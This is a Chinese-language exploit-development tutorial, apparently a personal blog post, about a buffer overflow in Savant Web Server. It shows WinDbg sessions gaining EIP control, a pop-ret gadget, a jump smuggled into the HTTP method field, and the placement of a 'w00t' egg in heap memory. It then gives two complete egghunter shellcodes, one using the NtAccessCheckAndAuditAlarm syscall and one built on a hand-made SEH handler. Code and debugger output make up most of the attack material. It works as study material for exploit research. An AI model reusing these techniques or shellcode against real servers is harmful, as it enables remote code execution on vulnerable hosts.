---
layout: default
---

> 这回主要讲一下egghunter的原理及使用,前面溢出过程简要介绍,详细可参考之前文章.

# 1.溢出

> 1.1 控制EIP

```c
(1d58.604): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
*** WARNING: Unable to verify checksum for Savant.exe
eax=ffffffff ebx=020e2c18 ecx=a100ed30 edx=00000000 esi=020e2c18 edi=0041703c
eip=41414141 esp=03ebea2c ebp=41414141 iopl=0         nv up ei pl nz na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010206
41414141 ?? 

EIP己经被完全控制
```
>1.2 查找溢出数据的位置

```c
通过观察寄存器信息未发现数据信息,查看一下栈内数据.
0:007> dds esp L2
03ebea2c  00414141 Savant+0x14141
03ebea30  03ebea84

--------------------esp+4处存放着完整溢出数据-----------------------
0:007> dc poi(esp+4)
03ebea84  00544547 00000000 00000000 00000000  GET.............
03ebea94  00000000 00000000 4141412f 41414141  ......../AAAAAAA
03ebeaa4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
03ebeab4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
03ebeac4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
03ebead4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
03ebeae4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
03ebeaf4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
```
>1.3 使用pop reg;ret;即可完成EIP跳转

```c
查看一下可以利用的模块,发现只有Savant模块未开启保护.
start    end        module name
00400000 00452000   Savant   C (no symbols)  

那只能利用此模块,但Savant地址中包含0x00字符,这个字符不能使用.
根据不断尝试溢出字符长度,可以得到以下结果: 
(1454.1664): Break instruction exception - code 80000003 (first chance)
*** WARNING: Unable to verify checksum for Savant.exe
eax=00000000 ebx=02152cc8 ecx=0000000e edx=03ebe490 esi=02152cc8 edi=0041703c
eip=00424242 esp=03ebea2c ebp=41414141 iopl=0         nv up ei pl nz na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000206
Savant+0x24242:
00424242 cc              int     3

在EIP溢出3个字节时,第4个字节会自动填充为0x00.

```
>1.4 到底pop到哪个寄存器比较合适

```c
0:007> dc poi(esp+4)
03ebea84  00544547 00000000 00000000 00000000  GET.............
03ebea94  00000000 00000000 4141412f 41414141  ......../AAAAAAA

EIP跳转到此处执行时前25个字节为系统自动填充进来的,并不需要执行,看一下汇编代码解释.
03ebea84 47              inc     edi
03ebea85 45              inc     ebp
03ebea86 54              push    esp
03ebea87 0000            add     byte ptr [eax],al
03ebea89 0000            add     byte ptr [eax],al
03ebea8b 0000            add     byte ptr [eax],al
03ebea8d 0000            add     byte ptr [eax],al
03ebea8f 0000            add     byte ptr [eax],al
03ebea91 0000            add     byte ptr [eax],al
03ebea93 0000            add     byte ptr [eax],al
03ebea95 0000            add     byte ptr [eax],al
03ebea97 0000            add     byte ptr [eax],al
03ebea99 0000            add     byte ptr [eax],al
03ebea9b 002f            add     byte ptr [edi],ch
03ebea9d 41              inc     ecx

似乎除了eax (ffffffff)外,其余操作不会影响到执行.那就直接pop eax;ret;就可以了.

```

> 1.5 失败

```c
可利用EIP跳转地址如下:
0:007> u 0x00418674
Savant+0x18674:
00418674 58              pop     eax
00418675 c3              ret

-------------------edi地址的内存写入失败--------------------
0:007> t
(994.2360): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=03fafe70 ebx=02302cc8 ecx=0000000e edx=03fae490 esi=02302cc8 edi=0041703d
eip=03faea9b esp=03faea30 ebp=41414142 iopl=0         nv up ei pl nz na pe cy
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010207
03faea9b 002f            add     byte ptr [edi],ch          ds:002b:0041703d=8b

```

> 1.6 尝试其他方法,尝试修改HTTP头,看看有没有什么效果

```c
0:007> dc 03e8ea84
03e8ea84  43434343 43434343 00000000 00000000  CCCCCCCC........
03e8ea94  00000000 00000000 4141412f 41414141  ......../AAAAAAA
03e8eaa4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
```
> 1.7 那么使用HTTP头直接跳过中间无用代码
> `需要检测坏字符`

```c
这里使用JCC跳过.
xor ecx,ecx
inc ecx
jnp 0x14
----------------------------------
0:007> u poi(esp+4)
03f0ea84 31c9            xor     ecx,ecx
03f0ea86 41              inc     ecx
03f0ea87 7b14            jnp     03f0ea9d

```
>1.8 这时shellcode就可以执行了.`只有253字节的shellcode空间`

# 2. Egghunters
> 2.1 想要更大的shellcode空间,那么尝试下在HTTP后加入一些数据看看.

```c
\r\n\r\n
b"w00tw00t" + b"\x44" * 400

----------------成功找到数据------------------
0:007> s -a 0x0 L?80000000 w00tw00t
043d8184  77 30 30 74 77 30 30 74-44 44 44 44 44 44 44 44  w00tw00tDDDDDDDD

----------------查看数据内存位置------------------
0:007> !address 043d8184  
Usage:                  Heap
Base Address:           043d0000
End Address:            043e0000
```
>2.2 数据在堆空间上面,那么就需要一种方法查找到数据所在的位置,这就是`egghunters`的作用.
>		`在刚才253字节的shellcode内写入代码来查找egg,然后跳转过去,不就可以了.`

# 3. 第一种实现方式
>3.1 需要使用一种方式来判断访问内存是否合法.
```c
通过调用NtAccessCheckAndAuditAlarm后返回值来确定内存是否可以访问.
eax ---> 指定系统调用号
edx ---> 指向esp地址,esp中保存函数调用参数
当edx指向的内存不可访问时:	 eax = STATUS_ACCESS_VIOLATION (0xc0000005).
当edx指向的内存可访问时:	 eax = STATUS_NO_IMPERSONATION_TOKEN(0xC000005C)

-------------------查找系统调用号(29H)-----------------------
0:007> u ntdll!NtAccessCheckAndAuditAlarm
ntdll!NtAccessCheckAndAuditAlarm:
770228a0 b829000000      mov     eax,29h
770228a5 bad06a0377      mov     edx,offset ntdll!Wow64SystemServiceCall (77036ad0)
770228aa ffd2            call    edx
770228ac c22c00          ret     2Ch 
```
>3.2 wow64 中断问题

```c
32位程序在64位系统上运行时,并不是直接使用int 2E进入内核.
32位程序的段选择子为20, 64位程序段选择子为30.
32位程序会先使用jmp far 33:address(TEB+0xC0). 来切换段选择子到64位环境,然后在64位环境下进入内核.
```

>3.3 egghunter
```c
"\x33\xD2"              #XOR EDX,EDX				;edx清0
"\x66\x81\xCA\xFF\x0F"  #OR DX,0FFF					;跳转到当前page页尾(10-10-12分页)
"\x33\xDB"              #XOR EBX,EBX 				;ebx清0
"\x42"                  #INC EDX					;页面地址偏移+1
"\x52"                  #PUSH EDX		
"\x53"                  #PUSH EBX
"\x53"                  #PUSH EBX
"\x53"                  #PUSH EBX
"\x53"                  #PUSH EBX
"\x6A\x29"              #PUSH 29  					;系统调用号29h
"\x58"                  #POP EAX					;eax=系统调用号29h
"\xB3\xC0"              #MOV BL,0C0					;TEB偏移
"\x64\xFF\x13"          #CALL DWORD PTR FS:[EBX] 	;进入64位环境
"\x83\xC4\x10"          #ADD ESP,0x10				;平衡栈
"\x5A"                  #POP EDX					;还原页面地址
"\x3C\x05"              #CMP AL,5					;判断NtAccessCheckAndAuditAlarm返回值
"\x74\xE3"              #JE SHORT					;失败跳转至 #OR DX,0FFF
"\xB8\x77\x30\x30\x74"  #MOV EAX,74303077			;关键字 w00t
"\x8B\xFA"              #MOV EDI,EDX				;页面地址赋值给edi
"\xAF"                  #SCAS DWORD PTR ES:[EDI]	;查找2次w00t
"\x75\xDE"              #JNZ SHORT					;失败跳转至 #INC EDX 继续查找一下个地址
"\xAF"                  #SCAS DWORD PTR ES:[EDI]
"\x75\xDB"              #JNZ SHORT					;失败跳转至 #INC EDX 继续查找一下个地址
"\xFF\xE7"              #JMP EDI					;成功跳转到目标地址执行shellcode
```
# 4. 第二种实现方式
> 4.1 上述方法有一种缺点,`系统调用号在不同的系统版本上不一致.`

```c
既然在访问非法内存时系统会产生异常,那么就插入一个SEH来捕获异常跳过非法页面继续执行就行了.
```
>4.2 SEH 问题

```c
SEH代码执行会存在一些条件判断:
1. _EXCEPTION_REGISTRATION_RECORD必须高于StackLimit
2. _EXCEPTION_REGISTRATION_RECORD必须低于StackBase
3. _EXCEPTION_REGISTRATION_RECORD必须4字节对齐
4. _except_handler必须高于StackBase

在插入SEH时,我们的_except_handler代码刚好是在栈上的,这时无法满足第4个条件.
那么把StackBase覆盖成_except_handler - 4 就可以满足.
```
>4.3 egghunter

```c
start:
    jmp get_seh_address         ;使用jmp;call;pop的getPC方式,避免直接使用CALL造成的0x00. 

build_exception_record:
    pop ecx                     ;getPC得到seh地址
    mov eax,0x74303077          ;关键字 w00t
    
    push ecx                    ;push handler
    push 0xffffffff             ;push next

    xor ebx,ebx
    mov dword ptr fs:[ebx],esp    ;将seh加入到TEB中

    sub ecx, 0x04                 ;ecx =  _except_handler - 4
    add ebx, 0x04                 ;StackBase offset
    mov dword ptr fs:[ebx] , ecx  ;StackBase =  _except_handler - 4

is_egg:
    push 0x02
    pop ecx                     ;ecx计数器设置为2

    mov edi,ebx
    repe scasd                  ;查找2次w00t

    jnz loop_inc_one            ;没找到则继续查找
    jmp edi                     ;找到则jmp

loop_inc_page:
    or bx,0xfff                 ;跳转到当前page页尾(10-10-12分页)

loop_inc_one:
    inc ebx                     ;页面地址偏移+1
    jmp is_egg                  ;查找egg

get_seh_address:
    call build_exception_record

    push 0x0c
    pop ecx                           ;pcontext栈偏移

    mov eax,[esp+ecx]                 ;得到CONTEXT
    mov cl,0xb8                       ;EIP偏移
    add dword ptr ds:[eax+ecx], 0x06  ;使eip+0x06

    pop eax
    add esp,0x10                      ;释放栈空间
    push eax                          ;push返回地址
    xor eax,eax                       ;ExceptionContinueExecution = 0n0 程序继续执行
    ret
```

> GetPC参考:

```c
	$+0     EB XX       JMP     SHORT $+N   ; Jump to the call instruction
	$+5:    59          POP     ECX         ; ECX = $+N+5
	$+6:    ...shellcode...
	$+N:    E8 FFFFFFXX CALL    $+5         ; PUSH $+N+5 onto the stack and jump back to $+5
```

> SEH可参考之前文章.
> Egghunters参考: https://www.corelan.be/index.php/2019/04/23/windows-10-egghunter/
> Exploit参考:	https://www.exploit-db.com/search?q=Savant+Web+Server
